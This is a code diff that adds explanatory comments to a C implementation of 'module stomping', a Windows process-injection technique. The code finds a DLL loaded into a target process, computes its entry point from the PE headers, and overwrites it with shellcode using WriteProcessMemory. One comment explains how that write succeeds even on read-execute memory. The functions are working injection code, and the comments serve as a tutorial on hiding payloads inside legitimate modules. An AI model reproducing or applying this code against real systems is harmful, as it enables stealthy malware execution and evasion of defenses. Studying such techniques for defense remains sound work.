@@ -13,9 +13,14 @@
 #include <string.h>
 #include <Psapi.h>
 
-// helper functions
+// helper functions - FindModuleBase and FindEntryPoint
 
-// Find loaded module address
+/*
+    FindModuleBase - Find the entry point address of the DLL.
+    After loading the module inside the injected process by LoadLibraryA, we do not know the address of the Loaded DLL.
+    FindModuleBase takes in the handle to the injected process and parses all modules (DLLs) while matching them to the target DLL name.
+    The function returns the handle to the target module (DLL).
+*/
 HMODULE FindModuleBase(HANDLE hProcess) {
     HMODULE hModuleList[1024];
     wchar_t moduleName[MAX_PATH];
@@ -38,6 +43,16 @@ HMODULE FindModuleBase(HANDLE hProcess) {
 
     return 0;
 }
+
+/*
+    FindEntryPoint - Find the address of the entry point within the DLL.
+    By utilizing a tool such as CFF Explorer, the DLL can be parsed to analyse the strucure of DLL headers.
+    The entry point of the DLL resides under NT Headers -> Optional Headers -> AddressOfEntryPoint.
+    One needs to add the base address of the dll with the AddressOfEntryPoint to arrive at the absolute address.
+    FindEntryPoint takes in handle to the target/injected process and handle to the injected module (dll).
+    Then it parses the headers inside the injected module to find address of entry point and adds it to the address of the target process module.
+    Finally, it returns this absolute address.
+*/
 
 LPVOID FindEntryPoint(HANDLE hProcess, HMODULE hModule) {
     LPVOID targetDllHeader = { 0 };
@@ -120,6 +135,17 @@ BOOL ModuleStomping(unsigned char payload[], SIZE_T payload_size, int pid) {
     entryPoint = FindEntryPoint(hProcess, moduleBase);
 
     // writing to the process memory
+    /*
+    The memory protection at the entrypoint of the DLL is RX. 
+    However, we are still able to over-write our shell code at this location even without write permissions.
+    This is possible due to the below WriteProcessMemory API.
+    Link: https://doxygen.reactos.org/d9/dd7/dll_2win32_2kernel32_2client_2proc_8c.html#a0126f021bd719d97e646942198e427c5
+    Gist - The WriteProcessMemory first makes the region permission to RWX and stores the old permission (our case - RX)
+        - Next, it checks if Write permission was present and if not (which is our case), it hits the next block of if-else
+        - In this else block, it check if the old permission was read-only or no-access. 
+        - Since ours is RX, this condition is false, and we fall in to another block of if-else.
+        - In this else block, the API writes into the memory and restores old permission.
+    */
     if(!WriteProcessMemory(hProcess, entryPoint, payload, payload_size, NULL)) {
         printf("[-] Could not write shell code in the entry point of the loaded dll. Error: %d\n", GetLastError());
         return FALSE;
